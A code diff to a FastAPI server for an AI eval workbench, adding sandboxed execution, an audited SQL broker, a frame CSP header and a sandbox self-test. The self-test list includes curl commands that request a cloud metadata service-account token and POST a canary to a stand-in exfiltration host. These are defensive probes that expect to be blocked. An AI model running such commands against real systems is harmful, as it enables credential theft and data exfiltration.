@@ -1,6 +1,7 @@
 import asyncio
 import json
 import os
+import secrets
 import subprocess
 import time
 import uuid
@@ -14,6 +15,7 @@ from fastapi import FastAPI, HTTPException, Request, WebSocket, WebSocketDisconn
 from fastapi.responses import PlainTextResponse
 from fastapi.staticfiles import StaticFiles
 
+import audit
 import context
 import ollama_client
 import sqlrun
@@ -21,9 +23,11 @@ import tools
 from agent import EFFORT, NUM_CTX, Turn, think_param
 from catalog import Catalog
 from eval_harness import EvalHarness
+from executors import LocalExecutor
 from gpu_detect import check_compatibility, detect_gpu
 from mcp_client import MCPTools
 from model_manager import ModelManager
+from openshell_exec import OpenShellExecutor
 from models import (
     Artifact, Base, ChatMessage, ChatSession, ChatSettings, EvalRun, EvalTask, HardwareInfo, ModelCompat,
 )
@@ -37,6 +41,9 @@ eval_harness = EvalHarness(store)
 model_manager = ModelManager()
 mcp = MCPTools()
 catalog = Catalog()
+# run_shell / run_python: executors[governed]
+sandbox = OpenShellExecutor()
+executors = {False: LocalExecutor(), True: sandbox}
 # asyncio only keeps weak references to tasks; hold them until they finish.
 background_tasks = set()
 
@@ -63,10 +70,20 @@ async def lifespan(app: FastAPI):
     spawn(model_manager.bootstrap(compat))
     spawn(mcp.refresh(force=True))
     spawn(catalog.refresh_loop(mcp))
+    spawn(sandbox.setup())
     yield
 
 
 app = FastAPI(title="Nemotron Eval Terminal", lifespan=lifespan)
+
+
+@app.middleware("http")
+async def frame_policy(request: Request, call_next):
+    # A mini-app could navigate its own iframe to another site with data in the
+    # URL; the page's frame-src stops that (its own CSP cannot).
+    response = await call_next(request)
+    response.headers.setdefault("Content-Security-Policy", "frame-src 'self' blob: data:")
+    return response
 
 
 # ---------------------------------------------------------------- helpers
@@ -170,6 +187,7 @@ async def status():
         "context": context.context_status(),
         "catalog": {"datasets": len(catalog.datasets), "buckets": len(catalog.buckets), "updated_at": catalog.updated_at, "error": catalog.error},
         "num_ctx": NUM_CTX,
+        "openshell": sandbox.status,
     }
 
 
@@ -259,7 +277,7 @@ async def ws_chat(websocket: WebSocket, session_id: str):
                 await emit({"type": "status", "content": f"Loading {settings.model_id} into GPU memory (can take 1–2 minutes after a restart or model switch)…"})
         except Exception:
             pass
-        turn = Turn(session, settings, store, mcp, catalog, model_manager.info.get(settings.model_id, {}), emit, confirm)
+        turn = Turn(session, settings, store, mcp, catalog, model_manager.info.get(settings.model_id, {}), emit, confirm, executors)
         await turn.run()
         await emit({"type": "session", "session": session_summary(session)})
 
@@ -486,6 +504,78 @@ async def sql_run(body: SQLRequest):
 async def sql_query(body: SQLRequest):
     """For HTML mini-apps: SELECT only."""
     return await _sql(body, read_only=True)
+
+
+# ---------------------------------------------------------------- governance (OpenShell pilot)
+
+class BrokerRequest(Base):
+    sql: str
+    max_rows: int = 1000
+
+
+@app.post("/broker/sql")
+async def broker_sql(body: BrokerRequest, request: Request):
+    """SQL broker for code running in governed sandboxes. The sandbox only has a
+    placeholder for this token; its OpenShell supervisor adds the real one."""
+    supplied = request.headers.get("authorization", "").removeprefix("Bearer ").strip()
+    if not secrets.compare_digest(supplied, sandbox.token):
+        audit.record("-", "broker", "deny", "broker_sql", "missing or wrong broker token", {"sql": body.sql})
+        raise HTTPException(401, "invalid broker token")
+    try:
+        result = await sqlrun.run_governed(body.sql, body.max_rows)
+    except sqlrun.PolicyDenied as e:
+        audit.record("sandbox", "broker", "deny", "broker_sql", str(e), {"sql": body.sql})
+        raise HTTPException(403, f"Blocked by policy: {e}")
+    except Exception as e:
+        raise HTTPException(400, sqlrun.friendly_error(e))
+    audit.record("sandbox", "broker", "allow", "broker_sql", f"{result['bytes_processed']} bytes", {"sql": body.sql})
+    return result
+
+
+@app.get("/api/audit")
+async def audit_events(limit: int = 500, session_id: Optional[str] = None):
+    return audit.recent(limit, session_id)
+
+
+@app.get("/api/governance")
+async def governance():
+    return {
+        "openshell": sandbox.status,
+        "datasets": sqlrun.GOVERNED_DATASETS,
+        "max_bytes": sqlrun.GOVERNED_MAX_BYTES,
+        "max_rows": sqlrun.GOVERNED_MAX_ROWS,
+        "policy": (APP_ROOT / "openshell" / "policy.yaml").read_text() if (APP_ROOT / "openshell" / "policy.yaml").exists() else "",
+        "denied_tools": sorted(n for n in mcp.by_name if not tools.governed_allows(n)),
+    }
+
+
+# Checks a governed sandbox should pass, run on demand from Status.
+SELFTEST = [
+    ("identity", "shell", "id; uname -r", "runs as a non-root user"),
+    ("broker token is a placeholder", "shell", "echo \"$WORKBENCH_BROKER_TOKEN\" | cut -c1-24", "starts with openshell:"),
+    ("no Google credentials", "shell", "curl -s -m 5 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; echo \"exit=$?\"", "blocked"),
+    ("internet blocked", "shell", "curl -s -m 8 -o /dev/null -w '%{http_code}' https://example.com; echo \" exit=$?\"", "blocked"),
+    ("exfiltration host blocked", "shell", "curl -s -m 8 -X POST https://qc-collector.baseline-study.invalid/v1/register -d canary=CANARY-RT-0001; echo \"exit=$?\"", "blocked"),
+    ("broker: allowed query", "python", "from workbench_data import query\nprint(query('SELECT COUNT(*) AS n FROM redteam_bhs.EHR_DEMOGRAPHIC'))", "returns a count"),
+    ("broker: other dataset refused", "python", "from workbench_data import query\ntry:\n    print(query('SELECT COUNT(*) FROM eval_bhs.EHR_DEMOGRAPHIC'))\nexcept Exception as e:\n    print('refused:', e)", "refused"),
+    ("broker: other paths blocked", "shell", "curl -s -m 8 -X POST http://host.openshell.internal:8080/api/sql/run -H 'Content-Type: application/json' -d '{\"sql\": \"SELECT 1\"}'; echo \" exit=$?\"", "blocked"),
+    ("filesystem: cannot write outside workdir", "shell", "touch /usr/local/x 2>&1; touch /sandbox/ok && echo sandbox-writable", "permission denied"),
+]
+
+
+@app.post("/api/governance/selftest")
+async def governance_selftest():
+    session_id = "selftest-" + uuid.uuid4().hex[:6]
+    results = []
+    try:
+        for name, kind, code, expect in SELFTEST:
+            started = time.time()
+            r = await (sandbox.shell(session_id, code) if kind == "shell" else sandbox.python(session_id, code))
+            results.append({"check": name, "expect": expect, "output": r["text"][-1500:],
+                            "blocked": r.get("blocked"), "seconds": round(time.time() - started, 1)})
+    finally:
+        await sandbox.delete(session_id)
+    return {"session_id": session_id, "openshell": sandbox.status, "results": results}
 
 
 # ---------------------------------------------------------------- tools (slash commands)
